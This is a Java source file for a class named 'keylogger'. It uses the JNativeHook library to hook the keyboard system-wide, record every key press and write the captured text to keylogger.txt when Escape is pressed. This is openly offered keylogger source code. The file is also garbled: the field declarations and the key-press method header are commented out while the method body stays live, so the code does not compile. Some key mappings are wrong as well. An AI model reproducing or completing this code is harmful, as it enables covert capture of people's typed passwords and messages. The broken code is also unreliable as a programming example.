/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.sever;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 *
 * @author HUNG
 */
public class keylogger implements NativeKeyListener{
//     static String s = "";
//     boolean st;

//     @Override
//     public void nativeKeyPressed(NativeKeyEvent evt) {
//         // System.out.println("Key Pressed: " +
//         // NativeKeyEvent.getKeyText(e.getKeyCode()));

//         if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
//             st = true;
//         }
        
//         if (st == false) {
//             s = s + NativeKeyEvent.getKeyText(e.getKeyCode());
//         }

//         if (evt.getKeyCode() == NativeKeyEvent.VC_1 && st) {

//             s = s + "!";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_2 && st) {

//             s = s + "@";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_3 && st) {

//             s = s + "#";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_4 && st) {

//             s = s + "$";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_5 && st) {

//             s = s + "%";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_6 && st) {

//             s = s + "^";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_7 && st) {

//             s = s + "&";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_8 && st) {

//             s = s + "*";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_9 && st) {

//             s = s + "(";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_0 && st) {

//             s = s + ")";

//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_SPACE && st) {

//             s = s + " ";
//         }

//         if (evt.getKeyCode() == NativeKeyEvent.VC_EQUALS&& st) {

//             s = s + "+";
//         }
//         if (evt.getKeyCode() == NativeKeyEvent.VC_UNDERSCORE&& st) {

//             s = s + "_";
//         }
      

//         if (evt.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
//             try {
//                 File f = new File("D:\\keys.txt");
//                 try (FileWriter fw = new FileWriter(f)) {
//                     fw.write(s);
//                 }

//                 GlobalScreen.unregisterNativeHook();
//             } catch (NativeHookException | IOException ef) {
//             }
//         }
     String temp=NativeKeyEvent.getKeyText(evt.getKeyCode());


       switch (temp)
        {
            case "1":
                s+="!";
                break;
            case "2":
                s+="@";
                break;
            case"3":
                s+="#";
                break;
            case"4":
                s+="$";
                break;
            case"5":
                s+="%";
                break;
            case "6":
                s+="^";
                break;
            case "7":
                s+="&";
                break;
            case"8":
                s+="*";
                break;
            case "9":
                s+="(";
                break;
            case "0":
                s+=")";
                break;
            case "Minus":
                s+="_";
                break;
            case "Equals":
                s+="+";
                break;
            case"Open Bracket":
                s+="{";
                break;
            case"Close Bracket":
                s+="}";
                break;
            case"Back Slash":
                s+="|";
                break;
            case"Slash":
                s+="?";
                break;
            case"Semicolon":
                s+=":";
                break;
            case"Quote":
                s+='"';
                break;
            case"Comma":
                s+="<";
                break;
            case"Period":
                s+=">";
                break;
            case"Back Quote":
                s+="~";
                break;
            case"Backspace":
                s+="[Back]";
                break;
            case"Space":
                s+=" ";
                break;
            case "Tab":
                s+="\t";
                break;
            case"Enter":
                s="\n";
                break;
            case"Alt":
                s+="[Alt]";
                break;
            case "Escape":
                try {
                    File f = new File("keylogger.txt");
                    try (FileWriter fw = new FileWriter(f)) {
                        fw.write(s);
                    }

                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException | IOException ef) {
                }
                break;
            default:
                if (temp.length()>1)
                {
                    s+=temp;
                }
                else{
                    s+=temp.toLowerCase();
                }
                break;

        }
    }


    @Override
    public void nativeKeyReleased(NativeKeyEvent evt) {
         System.out.println("Key Released: " +
         NativeKeyEvent.getKeyText(evt.getKeyCode()));
        if (evt.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = false;
        }
    }


    @Override
    public void nativeKeyTyped(NativeKeyEvent evt) {
         System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(evt.getKeyCode()));
    }

//    public static void main(String[] args) throws Exception {
//        try {
//
//            GlobalScreen.registerNativeHook();
//        } catch (NativeHookException ex) {
//
//            System.err.println("There was a problem registering the native hook.");
//            System.err.println(ex.getMessage());
//            System.exit(1);
//        }
//
//    }
}
